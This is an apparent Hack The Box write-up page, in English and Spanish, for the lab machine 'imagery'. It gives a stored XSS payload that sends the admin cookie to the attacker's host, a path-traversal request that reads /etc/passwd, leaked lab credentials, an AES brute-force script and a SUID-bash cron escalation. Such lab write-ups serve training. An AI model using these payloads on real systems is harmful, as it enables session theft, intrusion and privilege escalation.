@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>imagery | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">imagery</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Flask-based image gallery application on port 8000. Initial reconnaissance revealed a bug report feature that was vulnerable to stored Cross-Site Scripting (XSS). By injecting a malicious payload that exfiltrated the administrator's session cookie, I was able to hijack the admin session and gain elevated privileges within the application.</p>
+                    
+                    <p>With administrator access, I discovered a Local File Inclusion (LFI) vulnerability in the log download functionality at <code>/admin/get_system_log</code>, which allowed me to read arbitrary files from the filesystem. This exposed application source code revealing a test user account and a file upload feature that processed images using PHP parameters, which could be exploited for command injection.</p>
+                    
+                    <p>After authenticating as the test user, I exploited the command injection vulnerability in the image processing API to obtain a reverse shell as the <code>web</code> user. Lateral movement to the <code>mark</code> user was achieved by discovering and decrypting an AES-encrypted backup file containing database credentials. Finally, privilege escalation to root was accomplished by exploiting <code>sudo</code> permissions on the <code>charcol</code> cron management binary, which allowed me to create a malicious cron job that made <code>/bin/bash</code> a SUID binary.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Stored XSS for session hijacking, Local File Inclusion (LFI) for source code disclosure, command injection through image processing API, AES-encrypted file cracking, privilege escalation via cron job manipulation with SUID binary creation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services:</p>
+                <p><img src="./media/image7.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 8000" /></p>
+
+                <p>I also perform web technology enumeration using <code>whatweb</code>:</p>
+                <pre><code class="language-bash">whatweb 10.10.11.88:8000</code></pre>
+
+                <p>The results reveal interesting information about the web application:</p>
+                <pre><code class="language-plaintext">http://10.10.11.88:8000 [200 OK] Country[RESERVED][ZZ], Email[support@imagery.com], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.12.7], IP[10.10.11.88], Python[3.12.7], Script, Title[Image Gallery], Werkzeug[3.1.3]</code></pre>
+
+                <p>The application is running Flask with Werkzeug 3.1.3 and Python 3.12.7. The title indicates it's an "Image Gallery" application.</p>
+
+                <h2>Web Application Enumeration</h2>
+                <p>Upon accessing the web application, I find a login page for an image gallery service. After registering and logging in, I navigate to the <code>/images</code> path that was discovered during directory enumeration:</p>
+                <p><img src="./media/image15.png" alt="Image gallery interface showing uploaded images and groups" /></p>
+
+                <p>The application appears to be an image management system where users can upload images, organize them into groups, and manage their gallery. When attempting to create a new group for images, I receive a <code>403 Forbidden</code> response with an interesting message:</p>
+                <p><img src="./media/image5.png" alt="Error message showing 'feature still in development' for group creation" /></p>
+
+                <p>This "feature still in development" message suggests that certain functionality might not be properly secured or validated, which could be exploitable.</p>
+
+                <h3>Testing Upload Functionality</h3>
+                <p>I test the image upload feature and discover that uploaded images are accessible at <code>/uploads/uuid_filename.extension</code>. I intercept the upload request with Burp Suite to analyze the parameters and test for potential vulnerabilities such as command injection or parameter manipulation, but initial tests don't reveal anything immediately exploitable.</p>
+
+                <p>The delete functionality for images is also interesting. Here's what the delete request looks like:</p>
+                <p><img src="./media/image1.png" alt="Burp Suite showing the image deletion request" /></p>
+                <p><img src="./media/image3.png" alt="Full HTTP request for deleting an image with deleteAllDerived parameter" /></p>
+
+                <p>The request includes a <code>deleteAllDerived</code> parameter. When set to <code>true</code>, it deletes the image and all its copies or derived versions.</p>
+
+                <h3>Bug Report Feature</h3>
+                <p>I discover a bug report panel accessible to regular users:</p>
+                <p><img src="./media/image12.png" alt="Bug report submission form" /></p>
+
+                <p>After submitting a bug report, I receive a message indicating "admin review in progress". This strongly suggests that an administrator will view the submitted content, which makes this feature a prime candidate for Cross-Site Scripting (XSS) attacks. If an admin reviews user-submitted content, I can potentially steal their session cookie.</p>
+
+                <p>I initially test by including a URL to a server I control to see if the admin visits it, but I don't receive any requests. However, this feature remains interesting for further exploitation attempts.</p>
+
+                <h3>Client-Side Access Control Bypass</h3>
+                <p>During further enumeration, I discover an interesting endpoint that returns user properties:</p>
+                <p><img src="./media/image11.png" alt="HTTP request showing user properties endpoint" /></p>
+
+                <p>The response contains user properties in JSON format:</p>
+                <pre><code class="language-json">{"displayId":"d8000c8d","isAdmin":false,"isTestuser":false,"loggedIn":true,"username":"asd@asd.com"}</code></pre>
+
+                <p>I notice that the application implements access control using JavaScript based on the server's response. This means I can intercept and modify the response to change <code>isAdmin</code> and <code>isTestuser</code> to <code>true</code>, effectively bypassing client-side access controls.</p>
+
+                <p>Attempting to access the admin panel without modifications redirects me to:</p>
+                <p><img src="./media/image2.png" alt="Admin panel access denied message" /></p>
+
+                <p>However, while the UI elements can be manipulated, the actual backend endpoints still enforce proper access controls, so this client-side bypass alone doesn't grant access to admin functionality.</p>
+
+                <h3>Automating Response Modification</h3>
+                <p>To automate the interception and modification of responses in Burp Suite, I configure the following settings:</p>
+                <p><img src="./media/image13.png" alt="Burp Suite proxy options showing intercept settings" /></p>
+
+                <p>I create a Match and Replace rule to automatically modify the response:</p>
+                <p><img src="./media/image8.png" alt="Burp Suite match and replace rule for modifying isAdmin and isTestuser values" /></p>
+
+                <p>With this configuration, I now have access to the "Manage Groups" feature in the gallery interface:</p>
+                <p><img src="./media/image14.png" alt="Manage groups interface showing additional admin options" /></p>
+
+                <p>However, this feature relies on the <code>/move_images_to_collection</code> endpoint, which still enforces backend access controls, so it's not directly exploitable.</p>
+
+                <h3>Admin Endpoints Discovery</h3>
+                <p>Further enumeration reveals several admin endpoints under <code>/admin</code>:</p>
+                <p><img src="./media/image16.png" alt="List of admin endpoints discovered" /></p>
+
+                <p>Testing the <code>/admin/delete_user</code> endpoint confirms that proper backend access control is in place:</p>
+                <pre><code class="language-bash">curl -X POST http://10.10.11.88:8000/admin/delete_user -d '{}'</code></pre>
+
+                <pre><code class="language-json">{"message":"Access denied. Administrator privileges required.","success":false}</code></pre>
+
+                <h2>Gaining Administrator Access via XSS</h2>
+                <p>After extensive testing, I return to the bug report feature. As suspected earlier, this is indeed the attack vector. I craft an XSS payload to exfiltrate the administrator's session cookie:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch("10.10.14.18:8000?session=" + document.cookie)&gt;</code></pre>
+
+                <p>I submit this payload through the bug report form and wait. After several minutes, I receive a request on my Python HTTP server with the administrator's session cookie:</p>
+                <pre><code class="language-plaintext">10.10.11.88 - - "GET /?session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aN1-rA.YrUW3sPoc00q2hFwrja-tQWNyt4 HTTP/1.1" 200 -</code></pre>
+
+                <p>Using this stolen session token, I can now authenticate as the administrator and gain full access to all admin functionality.</p>
+
+                <h2>Local File Inclusion Vulnerability</h2>
+                <p>With administrator access, I explore the admin panel features. The administrator can download system logs and manage users. Examining the log download functionality, I notice the request points to a specific file path, which looks vulnerable to Local File Inclusion (LFI):</p>
+                <pre><code class="language-bash">curl http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../../../../../../../../../../../../../../../../etc/passwd --cookie "session={token}"</code></pre>
+
+                <p>The LFI vulnerability is confirmed! I can read arbitrary files from the system. Testing with <code>/etc/passwd</code>, I identify three users with bash shells:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+web:x:1001:1001::/home/web:/bin/bash
+mark:x:1002:1002::/home/mark:/bin/bash</code></pre>
+
+                <h3>Application Source Code Analysis</h3>
+                <p>Using the LFI vulnerability, I can read the application's source code. In the <code>config.py</code> file, I find interesting configuration details:</p>
+                <pre><code class="language-python">BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
+BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')</code></pre>
+
+                <p>More importantly, the configuration reveals the existence of a <code>db.json</code> file. Reading this database file, I discover user credentials:</p>
+                <pre><code class="language-json">"username": "admin@imagery.htb",
+"password": "5d9c1d507a3f76af1e5c97a3ad1eaa31"</code></pre>
+
+                <p>The password appears to be an MD5 hash, but attempts to crack it using online tools and hashcat are unsuccessful.</p>
+
+                <p>I also find a test user account with plaintext credentials:</p>
+                <pre><code class="language-plaintext">testuser@imagery.htb:iambatman</code></pre>
+
+                <p>Unfortunately, SSH only accepts key-based authentication, so these credentials cannot be used for SSH access.</p>
+
+                <h2>Command Injection via Image Processing API</h2>
+                <p>Continuing to read application source code through the LFI vulnerability, I discover a file named <code>api_edit.py</code> that contains a critical vulnerability:</p>
+                <p><img src="./media/image10.png" alt="Source code snippet showing command execution through PHP parameters" /></p>
+
+                <p>This code processes images using parameters that are passed to a command execution function. The vulnerability allows command injection through the image processing API, but accessing this feature requires the test user account.</p>
+
+                <p>I log in with the test user credentials (<code>testuser@imagery.htb:iambatman</code>) discovered earlier and gain access to the vulnerable feature:</p>
+                <p><img src="./media/image6.png" alt="Test user interface showing access to image editing API" /></p>
+
+                <h3>Obtaining Initial Shell Access</h3>
+                <p>To confirm command execution, I first test with a simple <code>ping</code> command to my attacking machine:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+
+                <p>After confirming RCE, I craft a reverse shell payload and inject it through the vulnerable image processing API. I successfully obtain a shell as the <code>web</code> user.</p>
+
+                <h2>Lateral Movement to Mark User</h2>
+                <p>After gaining access as the <code>web</code> user, I begin enumerating the system to find a path to the <code>mark</code> user whose home directory I identified earlier.</p>
+
+                <p>During enumeration, I discover the admin user's plaintext password for the web application: <code>strongsandofbeach</code>. However, this password doesn't work for the <code>mark</code> user's system account.</p>
+
+                <h3>Discovering Encrypted Backup</h3>
+                <p>In the <code>/var/backup</code> directory, I find an interesting encrypted file:</p>
+                <pre><code class="language-bash">ls -la /var/backup/
+web_20250806_120723.zip.aes</code></pre>
+
+                <p>The file is encrypted using AES encryption. To decrypt it, I use the <code>pyAesCrypt</code> Python library. Since I don't know the password, I write a small script to perform a brute-force attack using the rockyou wordlist:</p>
+                <pre><code class="language-python">import pyAesCrypt
+
+with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as wordlist:
+    for password in wordlist:
+        password = password.strip()
+        try:
+            pyAesCrypt.decryptFile('web_20250806_120723.zip.aes', 'decrypted.zip', password)
+            print(f"[+] Password found: {password}")
+            break
+        except:
+            continue</code></pre>
+
+                <p>After successfully decrypting the file, I extract a <code>web</code> folder containing a <code>db.json</code> file. This backup database contains Mark's password as an MD5 hash. I crack the hash using CrackStation and obtain Mark's credentials:</p>
+                <pre><code class="language-plaintext">mark:supersmash</code></pre>
+
+                <p>I successfully switch to the <code>mark</code> user and retrieve the user flag.</p>
+
+                <h2>Privilege Escalation to Root</h2>
+                <p>After gaining access as <code>mark</code>, I check for sudo privileges:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol</code></pre>
+
+                <p>The <code>mark</code> user can run <code>/usr/local/bin/charcol</code> with sudo privileges without a password. This appears to be a custom binary, not a standard Linux tool.</p>
+
+                <h3>Analyzing Charcol Binary</h3>
+                <p>I execute the binary to understand its functionality:</p>
+                <p><img src="./media/image9.png" alt="Charcol binary help output showing available commands" /></p>
+
+                <p>The <code>charcol</code> binary appears to be a cron job management tool. It allows users to create, list, and manage scheduled tasks. Most importantly, I notice that it has functionality to add new cron jobs:</p>
+                <p><img src="./media/image4.png" alt="Charcol interface showing cron job creation options" /></p>
+
+                <h3>Exploiting Cron Job Creation</h3>
+                <p>Since I can create cron jobs that run with elevated privileges through <code>sudo</code>, I can abuse this to gain root access. My strategy is to create a cron job that makes <code>/bin/bash</code> a SUID binary, which will allow me to spawn a root shell.</p>
+
+                <p>I create the malicious cron job using the <code>charcol</code> binary:</p>
+                <pre><code class="language-bash">sudo /usr/local/bin/charcol auto add --schedule "* * * * *" --command "chmod +s /usr/bin/bash" --name "xd"</code></pre>
+
+                <p>The output confirms the cron job was created successfully:</p>
+                <pre><code class="language-plaintext">[2025-10-04 19:57:31] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod +s /usr/bin/bash</code></pre>
+
+                <p>The cron job is scheduled to run every minute. After waiting for the job to execute, <code>/usr/bin/bash</code> becomes a SUID binary. I can now spawn a privileged shell:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <pre><code class="language-bash">bash-5.2# whoami
+root
+bash-5.2# cat /root/root.txt</code></pre>
+
+                <p>I successfully escalate to root and retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina objetivo ejecutaba una aplicación de galería de imágenes basada en Flask en el puerto 8000. El reconocimiento inicial reveló una funcionalidad de reporte de bugs vulnerable a Cross-Site Scripting (XSS) almacenado. Al inyectar un payload malicioso que exfiltraba la cookie de sesión del administrador, pude secuestrar la sesión de admin y obtener privilegios elevados dentro de la aplicación.</p>
+                    
+                    <p>Con acceso de administrador, descubrí una vulnerabilidad de Local File Inclusion (LFI) en la funcionalidad de descarga de logs en <code>/admin/get_system_log</code>, que permitía leer archivos arbitrarios del sistema de archivos. Esto expuso el código fuente de la aplicación revelando una cuenta de usuario de prueba y una funcionalidad de subida de archivos que procesaba imágenes usando parámetros PHP, que podía ser explotado para inyección de comandos.</p>
+                    
+                    <p>Tras autenticarme como el usuario de prueba, exploté la vulnerabilidad de inyección de comandos en la API de procesamiento de imágenes para obtener una reverse shell como el usuario <code>web</code>. El movimiento lateral al usuario <code>mark</code> se logró descubriendo y descifrando un archivo de backup cifrado con AES que contenía credenciales de la base de datos. Finalmente, la escalada de privilegios a root se consiguió explotando permisos <code>sudo</code> sobre el binario de gestión de cron <code>charcol</code>, que permitió crear un cron job malicioso que convirtió <code>/bin/bash</code> en un binario SUID.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> XSS almacenado para secuestro de sesión, Local File Inclusion (LFI) para divulgación de código fuente, inyección de comandos a través de API de procesamiento de imágenes, crackeo de archivos cifrados con AES, escalada de privilegios mediante manipulación de cron jobs con creación de binario SUID.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <p><img src="./media/image7.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 8000" /></p>
+
+                <p>También realizo una enumeración de tecnologías web usando <code>whatweb</code>:</p>
+                <pre><code class="language-bash">whatweb 10.10.11.88:8000</code></pre>
+
+                <p>Los resultados revelan información interesante sobre la aplicación web:</p>
+                <pre><code class="language-plaintext">http://10.10.11.88:8000 [200 OK] Country[RESERVED][ZZ], Email[support@imagery.com], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.12.7], IP[10.10.11.88], Python[3.12.7], Script, Title[Image Gallery], Werkzeug[3.1.3]</code></pre>
+
+                <p>La aplicación ejecuta Flask con Werkzeug 3.1.3 y Python 3.12.7. El título indica que es una aplicación de "Image Gallery".</p>
+
+                <h2>Enumeración de la Aplicación Web</h2>
+                <p>Al acceder a la aplicación web, encuentro una página de login para un servicio de galería de imágenes. Tras registrarme e iniciar sesión, navego a la ruta <code>/images</code> que fue descubierta durante la enumeración de directorios:</p>
+                <p><img src="./media/image15.png" alt="Interfaz de la galería de imágenes mostrando imágenes subidas y grupos" /></p>
+
+                <p>La aplicación parece ser un sistema de gestión de imágenes donde los usuarios pueden subir imágenes, organizarlas en grupos y gestionar su galería. Al intentar crear un nuevo grupo para imágenes, recibo una respuesta <code>403 Forbidden</code> con un mensaje interesante:</p>
+                <p><img src="./media/image5.png" alt="Mensaje de error mostrando 'feature still in development' para la creación de grupos" /></p>
+
+                <p>Este mensaje de "feature still in development" sugiere que ciertas funcionalidades podrían no estar debidamente securizadas o validadas, lo cual podría ser explotable.</p>
+
+                <h3>Probando la Funcionalidad de Subida</h3>
+                <p>Pruebo la funcionalidad de subida de imágenes y descubro que las imágenes subidas son accesibles en <code>/uploads/uuid_nombre_archivo.extension</code>. Intercepto la petición de subida con Burp Suite para analizar los parámetros y probar posibles vulnerabilidades como inyección de comandos o manipulación de parámetros, pero las pruebas iniciales no revelan nada inmediatamente explotable.</p>
+
+                <p>La funcionalidad de borrado de imágenes también es interesante. Así es como se ve el request de borrado:</p>
+                <p><img src="./media/image1.png" alt="Burp Suite mostrando el request de borrado de imagen" /></p>
+                <p><img src="./media/image3.png" alt="Request HTTP completo para borrar una imagen con el parámetro deleteAllDerived" /></p>
+
+                <p>El request incluye un parámetro <code>deleteAllDerived</code>. Cuando se establece a <code>true</code>, borra la imagen y todas sus copias o versiones derivadas.</p>
+
+                <h3>Funcionalidad de Reporte de Bugs</h3>
+                <p>Descubro un panel de reporte de bugs accesible para usuarios regulares:</p>
+                <p><img src="./media/image12.png" alt="Formulario de envío de reporte de bugs" /></p>
+
+                <p>Tras enviar un reporte de bug, recibo un mensaje indicando "admin review in progress". Esto sugiere fuertemente que un administrador revisará el contenido enviado, lo que hace que esta funcionalidad sea un candidato principal para ataques de Cross-Site Scripting (XSS). Si un admin revisa contenido enviado por usuarios, potencialmente puedo robar su cookie de sesión.</p>
+
+                <p>Inicialmente pruebo incluyendo una URL a un servidor que controlo para ver si el admin la visita, pero no recibo ningún request. Sin embargo, esta funcionalidad sigue siendo interesante para intentos posteriores de explotación.</p>
+
+                <h3>Bypass de Control de Acceso del Lado del Cliente</h3>
+                <p>Durante la enumeración adicional, descubro un endpoint interesante que devuelve propiedades del usuario:</p>
+                <p><img src="./media/image11.png" alt="Request HTTP mostrando el endpoint de propiedades de usuario" /></p>
+
+                <p>La respuesta contiene propiedades del usuario en formato JSON:</p>
+                <pre><code class="language-json">{"displayId":"d8000c8d","isAdmin":false,"isTestuser":false,"loggedIn":true,"username":"asd@asd.com"}</code></pre>
+
+                <p>Noto que la aplicación implementa control de acceso usando JavaScript basado en la respuesta del servidor. Esto significa que puedo interceptar y modificar la respuesta para cambiar <code>isAdmin</code> e <code>isTestuser</code> a <code>true</code>, efectivamente bypaseando los controles de acceso del lado del cliente.</p>
+
+                <p>Al intentar acceder al panel de administración sin modificaciones me redirige a:</p>
+                <p><img src="./media/image2.png" alt="Mensaje de acceso denegado al panel de administración" /></p>
+
+                <p>Sin embargo, aunque los elementos de la interfaz pueden manipularse, los endpoints del backend aún aplican controles de acceso adecuados, así que este bypass del lado del cliente por sí solo no otorga acceso a funcionalidad de administrador.</p>
+
+                <h3>Automatizando la Modificación de Respuestas</h3>
+                <p>Para automatizar la interceptación y modificación de respuestas en Burp Suite, configuro los siguientes ajustes:</p>
+                <p><img src="./media/image13.png" alt="Opciones de proxy de Burp Suite mostrando configuraciones de intercept" /></p>
+
+                <p>Creo una regla de Match and Replace para modificar automáticamente la respuesta:</p>
+                <p><img src="./media/image8.png" alt="Regla de match and replace de Burp Suite para modificar los valores de isAdmin e isTestuser" /></p>
+
+                <p>Con esta configuración, ahora tengo acceso a la funcionalidad "Manage Groups" en la interfaz de la galería:</p>
+                <p><img src="./media/image14.png" alt="Interfaz de gestión de grupos mostrando opciones adicionales de admin" /></p>
+
+                <p>Sin embargo, esta funcionalidad depende del endpoint <code>/move_images_to_collection</code>, que todavía aplica controles de acceso del backend, así que no es directamente explotable.</p>
+
+                <h3>Descubrimiento de Endpoints de Administración</h3>
+                <p>La enumeración adicional revela varios endpoints de administración bajo <code>/admin</code>:</p>
+                <p><img src="./media/image16.png" alt="Lista de endpoints de administración descubiertos" /></p>
+
+                <p>Probando el endpoint <code>/admin/delete_user</code> confirmo que el control de acceso adecuado del backend está en su lugar:</p>
+                <pre><code class="language-bash">curl -X POST http://10.10.11.88:8000/admin/delete_user -d '{}'</code></pre>
+
+                <pre><code class="language-json">{"message":"Access denied. Administrator privileges required.","success":false}</code></pre>
+
+                <h2>Obteniendo Acceso de Administrador mediante XSS</h2>
+                <p>Tras pruebas exhaustivas, vuelvo a la funcionalidad de reporte de bugs. Como sospeché anteriormente, este es efectivamente el vector de ataque. Creo un payload XSS para exfiltrar la cookie de sesión del administrador:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch("10.10.14.18:8000?session=" + document.cookie)&gt;</code></pre>
+
+                <p>Envío este payload a través del formulario de reporte de bugs y espero. Después de varios minutos, recibo un request en mi servidor HTTP de Python con la cookie de sesión del administrador:</p>
+                <pre><code class="language-plaintext">10.10.11.88 - - "GET /?session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aN1-rA.YrUW3sPoc00q2hFwrja-tQWNyt4 HTTP/1.1" 200 -</code></pre>
+
+                <p>Usando este token de sesión robado, ahora puedo autenticarme como el administrador y obtener acceso completo a toda la funcionalidad de administración.</p>
+
+                <h2>Vulnerabilidad de Local File Inclusion</h2>
+                <p>Con acceso de administrador, exploro las funcionalidades del panel de administración. El administrador puede descargar logs del sistema y gestionar usuarios. Examinando la funcionalidad de descarga de logs, noto que el request apunta a una ruta de archivo específica, que parece vulnerable a Local File Inclusion (LFI):</p>
+                <pre><code class="language-bash">curl http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../../../../../../../../../../../../../../../../etc/passwd --cookie "session={token}"</code></pre>
+
+                <p>¡La vulnerabilidad LFI se confirma! Puedo leer archivos arbitrarios del sistema. Probando con <code>/etc/passwd</code>, identifico tres usuarios con shells bash:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+web:x:1001:1001::/home/web:/bin/bash
+mark:x:1002:1002::/home/mark:/bin/bash</code></pre>
+
+                <h3>Análisis del Código Fuente de la Aplicación</h3>
+                <p>Usando la vulnerabilidad LFI, puedo leer el código fuente de la aplicación. En el archivo <code>config.py</code>, encuentro detalles de configuración interesantes:</p>
+                <pre><code class="language-python">BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
+BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')</code></pre>
+
+                <p>Más importante aún, la configuración revela la existencia de un archivo <code>db.json</code>. Leyendo este archivo de base de datos, descubro credenciales de usuarios:</p>
+                <pre><code class="language-json">"username": "admin@imagery.htb",
+"password": "5d9c1d507a3f76af1e5c97a3ad1eaa31"</code></pre>
+
+                <p>La contraseña parece ser un hash MD5, pero los intentos de crackearlo usando herramientas online y hashcat no tienen éxito.</p>
+
+                <p>También encuentro una cuenta de usuario de prueba con credenciales en texto plano:</p>
+                <pre><code class="language-plaintext">testuser@imagery.htb:iambatman</code></pre>
+
+                <p>Desafortunadamente, SSH solo acepta autenticación basada en claves, así que estas credenciales no pueden usarse para acceso SSH.</p>
+
+                <h2>Inyección de Comandos mediante API de Procesamiento de Imágenes</h2>
+                <p>Continuando con la lectura del código fuente de la aplicación a través de la vulnerabilidad LFI, descubro un archivo llamado <code>api_edit.py</code> que contiene una vulnerabilidad crítica:</p>
+                <p><img src="./media/image10.png" alt="Fragmento de código fuente mostrando ejecución de comandos a través de parámetros PHP" /></p>
+
+                <p>Este código procesa imágenes usando parámetros que se pasan a una función de ejecución de comandos. La vulnerabilidad permite inyección de comandos a través de la API de procesamiento de imágenes, pero acceder a esta funcionalidad requiere la cuenta del usuario de prueba.</p>
+
+                <p>Inicio sesión con las credenciales del usuario de prueba (<code>testuser@imagery.htb:iambatman</code>) descubiertas anteriormente y obtengo acceso a la funcionalidad vulnerable:</p>
+                <p><img src="./media/image6.png" alt="Interfaz del usuario de prueba mostrando acceso a la API de edición de imágenes" /></p>
+
+                <h3>Obteniendo Acceso Shell Inicial</h3>
+                <p>Para confirmar la ejecución de comandos, primero pruebo con un simple comando <code>ping</code> a mi máquina atacante:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+
+                <p>Tras confirmar el RCE, creo un payload de reverse shell y lo inyecto a través de la API vulnerable de procesamiento de imágenes. Obtengo exitosamente una shell como el usuario <code>web</code>.</p>
+
+                <h2>Movimiento Lateral al Usuario Mark</h2>
+                <p>Tras obtener acceso como el usuario <code>web</code>, comienzo a enumerar el sistema para encontrar un camino hacia el usuario <code>mark</code> cuyo directorio home identifiqué anteriormente.</p>
+
+                <p>Durante la enumeración, descubro la contraseña en texto plano del usuario admin de la aplicación web: <code>strongsandofbeach</code>. Sin embargo, esta contraseña no funciona para la cuenta del sistema del usuario <code>mark</code>.</p>
+
+                <h3>Descubriendo Backup Cifrado</h3>
+                <p>En el directorio <code>/var/backup</code>, encuentro un archivo cifrado interesante:</p>
+                <pre><code class="language-bash">ls -la /var/backup/
+web_20250806_120723.zip.aes</code></pre>
+
+                <p>El archivo está cifrado usando cifrado AES. Para descifrarlo, uso la librería Python <code>pyAesCrypt</code>. Como no conozco la contraseña, escribo un pequeño script para realizar un ataque de fuerza bruta usando la wordlist rockyou:</p>
+                <pre><code class="language-python">import pyAesCrypt
+
+with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as wordlist:
+    for password in wordlist:
+        password = password.strip()
+        try:
+            pyAesCrypt.decryptFile('web_20250806_120723.zip.aes', 'decrypted.zip', password)
+            print(f"[+] Password found: {password}")
+            break
+        except:
+            continue</code></pre>
+
+                <p>Tras descifrar exitosamente el archivo, extraigo una carpeta <code>web</code> que contiene un archivo <code>db.json</code>. Esta base de datos de backup contiene la contraseña de Mark como un hash MD5. Crackeo el hash usando CrackStation y obtengo las credenciales de Mark:</p>
+                <pre><code class="language-plaintext">mark:supersmash</code></pre>
+
+                <p>Cambio exitosamente al usuario <code>mark</code> y recupero la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios a Root</h2>
+                <p>Tras obtener acceso como <code>mark</code>, compruebo los privilegios sudo:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol</code></pre>
+
+                <p>El usuario <code>mark</code> puede ejecutar <code>/usr/local/bin/charcol</code> con privilegios sudo sin contraseña. Esto parece ser un binario personalizado, no una herramienta estándar de Linux.</p>
+
+                <h3>Analizando el Binario Charcol</h3>
+                <p>Ejecuto el binario para entender su funcionalidad:</p>
+                <p><img src="./media/image9.png" alt="Salida de ayuda del binario Charcol mostrando comandos disponibles" /></p>
+
+                <p>El binario <code>charcol</code> parece ser una herramienta de gestión de trabajos cron. Permite a los usuarios crear, listar y gestionar tareas programadas. Lo más importante es que noto que tiene funcionalidad para añadir nuevos trabajos cron:</p>
+                <p><img src="./media/image4.png" alt="Interfaz de Charcol mostrando opciones de creación de trabajos cron" /></p>
+
+                <h3>Explotando la Creación de Trabajos Cron</h3>
+                <p>Como puedo crear trabajos cron que se ejecutan con privilegios elevados a través de <code>sudo</code>, puedo abusar de esto para obtener acceso root. Mi estrategia es crear un trabajo cron que convierta <code>/bin/bash</code> en un binario SUID, lo que me permitirá generar una shell root.</p>
+
+                <p>Creo el trabajo cron malicioso usando el binario <code>charcol</code>:</p>
+                <pre><code class="language-bash">sudo /usr/local/bin/charcol auto add --schedule "* * * * *" --command "chmod +s /usr/bin/bash" --name "xd"</code></pre>
+
+                <p>La salida confirma que el trabajo cron se creó exitosamente:</p>
+                <pre><code class="language-plaintext">[2025-10-04 19:57:31] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod +s /usr/bin/bash</code></pre>
+
+                <p>El trabajo cron está programado para ejecutarse cada minuto. Tras esperar a que el trabajo se ejecute, <code>/usr/bin/bash</code> se convierte en un binario SUID. Ahora puedo generar una shell privilegiada:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <pre><code class="language-bash">bash-5.2# whoami
+root
+bash-5.2# cat /root/root.txt</code></pre>
+
+                <p>Escalo exitosamente a root y recupero la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
